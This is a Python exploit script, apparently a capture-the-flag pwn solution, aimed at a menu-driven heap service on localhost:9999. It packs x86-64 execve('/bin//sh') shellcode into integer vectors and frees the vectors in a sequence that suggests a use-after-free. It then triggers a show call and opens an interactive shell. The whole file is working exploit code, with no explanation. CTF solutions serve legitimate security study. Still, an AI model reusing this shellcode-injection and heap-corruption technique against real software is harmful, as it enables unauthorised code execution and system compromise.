from ptrlib import *

def add_vec(index, size, array):
    sock.recvuntil("Your choice:")
    sock.sendline("1")
    sock.recvuntil("Index:")
    sock.sendline(str(index))
    sock.recvuntil("Size:")
    sock.sendline(str(size))
    sock.recvuntil("stop:")
    sock.sendline(' '.join(list(map(str, array))))

def remove_vec(index):
    sock.recvuntil("Your choice:")
    sock.sendline("2")
    sock.recvuntil("index:")
    sock.sendline(str(index))

def show_vec(index):
    sock.recvuntil("Your choice:")
    sock.sendline("4")
    sock.recvuntil("index:")
    sock.sendline(str(index))

sock = Socket("localhost", 9999)

shellcode  = b"\x90\x90\x48\x31"
shellcode += b"\xc0\x50\x48\x31"
shellcode += b"\xd2\x90\x48\x31"
shellcode += b"\xf6\x48\xbb\x2f"
shellcode += b"\x62\x69\x6e\x2f"
shellcode += b"\x2f\x73\x68\x53"
shellcode += b"\x54\x5f\xb0\x3b"
shellcode += b"\x0f\x05\x00\x00"
vec_shellcode = [0, 0]
for i in range(0, len(shellcode), 4):
    vec_shellcode.append(u32(shellcode[i:i+4]))
    print(hex(vec_shellcode[-1]))
    assert vec_shellcode[-1] < 0x80000000
vec_shellcode.append(-1)
print(list(map(hex, vec_shellcode)))

add_vec(0, 10, [-1])
add_vec(1, 10, [0, 0, 0, 0, 0, 0, 0, 0, 0x34eb9090, -1])
add_vec(2, 20, vec_shellcode)
remove_vec(2)
remove_vec(1)
remove_vec(0)

show_vec(0)

sock.interactive()
